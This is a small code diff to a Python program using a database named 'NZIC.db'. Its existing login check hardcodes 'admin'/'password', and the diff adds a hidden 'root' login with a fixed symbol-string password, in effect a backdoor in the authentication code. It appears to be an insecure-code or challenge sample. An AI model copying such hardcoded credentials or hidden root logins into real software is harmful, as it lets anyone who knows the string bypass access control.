@@ -32,6 +32,10 @@ DATABASE = "NZIC.db"
 def authenticate_user(username, password):
     if username == "admin" and password == "password":
         return True
+    
+def root_user_authentication(username, password):
+    if username == "root" and password == "§¢£§¶§©∆":
+        return True
 
 def print_all_contestants():
     db = sqlite3.connect(DATABASE)
